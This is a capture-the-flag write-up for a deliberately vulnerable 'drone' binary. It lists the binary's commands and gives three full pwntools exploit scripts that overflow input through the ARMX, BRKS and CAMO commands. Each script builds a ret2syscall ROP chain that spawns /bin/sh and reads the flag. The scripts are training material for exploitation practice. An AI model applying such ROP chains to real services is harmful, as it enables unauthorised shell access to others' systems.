# Write-Up: Drone Adventure!

The binary source code is in [drone.c](drone.c). You can notice in the [Makefile](Makefile) that we used tigress to obfuscate the binary. However, picking up the commands should still be fairly easy to discover using strings.

```
> strings drone.bin | awk 'length($0) == 4 && $0 ~ /^[A-Z]+$/'
MOVE
BRKS
SCAN
RECD
LIGH
ARMX
SIGN
TRNS
CAMO
STOP
SAFE
SAMP
SENS
DEPL
TURN
CLAW
```

After that you can play with the commands for a little bit until you discover vulnerabilities. There are exploitable paths through ``ARMX, BRKS, CAMO, CLAW, RECVD, SAMP, SIGN, STOP`` commands. You can discover them with AFL++ or just hand jam around and find them. In some cases, you only get one gadget - at which point you can just call ``deprecated_feedback`` and them re-exploit yourself with a larger chain.

All the gadgets should exist to ``ret2syscall`

```python
    pop_rdx_rcx = r.find_gadget(["pop rax", "pop rdx", "pop rcx", "ret"])[0]
    pop_rdi_rsi = r.find_gadget(["pop rdi", "pop rsi", "syscall"])[0]
    sh = next(e.search(b"/bin/sh\0"))
    log.info(f"Pop rax, rdx, rcx, retgadget: {hex(pop_rdx_rcx)}")
    log.info(f"Pop rdi, rsi, syscall gadget: {hex(pop_rdi_rsi)}")
    log.info(f"sh: {hex(sh)}")

    chain = cyclic(264)
    chain += p64(pop_rdx_rcx)
    chain += p64(0x3B)  # rax = 0x3b
    chain += p64(0x0)  # rcx = 0
    chain += p64(0x0)  # rdx = 0
    chain += p64(pop_rdi_rsi)
    chain += p64(sh)  # rdi = sh
    chain += p64(0x0)

    p.recvuntil(b">>>")
    p.sendline(chain)
```

Examples of a couple different exploits

- exploit path through ``armx``

```python
from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = """
break *0x401747
continue
"""


def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote(args.HOST,args.PORT)
    else:
        return process(e.path)


def setup_overflow():
    p.recvuntil(b">>>")
    p.sendline(b"ARMX")
    p.recvuntil(b">>>")
    p.sendline(b"-2147483648")
    p.recvuntil(b">>>")
    p.sendline(b"ARMX")
    p.recvuntil(b">>>")
    p.sendline(b"-2147483648")


def syscall_chain():
    chain = ""

    pop_rdx_rcx = r.find_gadget(["pop rax", "pop rdx", "pop rcx", "ret"])[0]
    pop_rdi_rsi = r.find_gadget(["pop rdi", "pop rsi", "syscall"])[0]
    sh = next(e.search(b"/bin/sh\0"))
    log.info(f"Pop rax, rdx, rcx, retgadget: {hex(pop_rdx_rcx)}")
    log.info(f"Pop rdi, rsi, syscall gadget: {hex(pop_rdi_rsi)}")
    log.info(f"sh: {hex(sh)}")

    chain = cyclic(280)
    chain += p64(pop_rdx_rcx)
    chain += p64(0x3B)  # rax = 0x3b
    chain += p64(0x0)  # rcx = 0
    chain += p64(0x0)  # rdx = 0
    chain += p64(pop_rdi_rsi)
    chain += p64(sh)  # rdi = sh
    chain += p64(0x0)
    p.recvuntil(b">>>")
    p.sendline(chain)


p = start()

setup_overflow()
syscall_chain()

pause(1)
p.sendline(b'cat /flag.txt')

p.interactive()
```

- exploit path through *brks*

```python
from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = """
continue
"""


def unsafe():
    p.recvuntil(b">>>")
    p.sendline(b"SAFE")
    p.recvuntil(b">>>")
    p.sendline(b"N")


def setup_overflow():
    unsafe()
    p.recvuntil(b">>>")
    p.sendline(b"BRKS")
    p.recvuntil(b">>>")
    chain = cyclic(40)
    chain += p64(e.sym["deprecated_feedback"])
    p.sendline(chain)


def syscall_chain():
    pop_rdx_rcx = r.find_gadget(["pop rax", "pop rdx", "pop rcx", "ret"])[0]
    pop_rdi_rsi = r.find_gadget(["pop rdi", "pop rsi", "syscall"])[0]
    sh = next(e.search(b"/bin/sh\0"))
    log.info(f"Pop rax, rdx, rcx, retgadget: {hex(pop_rdx_rcx)}")
    log.info(f"Pop rdi, rsi, syscall gadget: {hex(pop_rdi_rsi)}")
    log.info(f"sh: {hex(sh)}")

    chain = cyclic(264)
    chain += p64(pop_rdx_rcx)
    chain += p64(0x3B)  # rax = 0x3b
    chain += p64(0x0)  # rcx = 0
    chain += p64(0x0)  # rdx = 0
    chain += p64(pop_rdi_rsi)
    chain += p64(sh)  # rdi = sh
    chain += p64(0x0)

    p.recvuntil(b">>>")
    p.sendline(chain)


def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote(args.HOST,args.PORT)
    else:
        return process(e.path)


p = start()

setup_overflow()
syscall_chain()

pause(1)
p.sendline(b'cat /flag.txt')

p.interactive()
```

- exploit path through *camo*

```python
from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = """
continue
"""


def unsafe():
    p.recvuntil(b">>>")
    p.sendline(b"SAFE")
    p.recvuntil(b">>>")
    p.sendline(b"N")


def setup_overflow():
    unsafe()
    p.recvuntil(b">>>")
    p.sendline(b"CAMO")
    p.recvuntil(b">>>")
    p.sendline(b"INT")


def syscall_chain():
    pop_rdx_rcx = r.find_gadget(["pop rax", "pop rdx", "pop rcx", "ret"])[0]
    pop_rdi_rsi = r.find_gadget(["pop rdi", "pop rsi", "syscall"])[0]
    sh = next(e.search(b"/bin/sh\0"))
    log.info(f"Pop rax, rdx, rcx, retgadget: {hex(pop_rdx_rcx)}")
    log.info(f"Pop rdi, rsi, syscall gadget: {hex(pop_rdi_rsi)}")
    log.info(f"sh: {hex(sh)}")

    chain = cyclic(264)
    chain += p64(pop_rdx_rcx)
    chain += p64(0x3B)  # rax = 0x3b
    chain += p64(0x0)  # rcx = 0
    chain += p64(0x0)  # rdx = 0
    chain += p64(pop_rdi_rsi)
    chain += p64(sh)  # rdi = sh
    chain += p64(0x0)

    p.recvuntil(b">>>")
    p.sendline(chain)


def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote(args.HOST,args.PORT)
    else:
        return process(e.path)


p = start()

setup_overflow()
syscall_chain()

pause(1)
p.sendline(b'cat /flag.txt')

p.interactive()

```
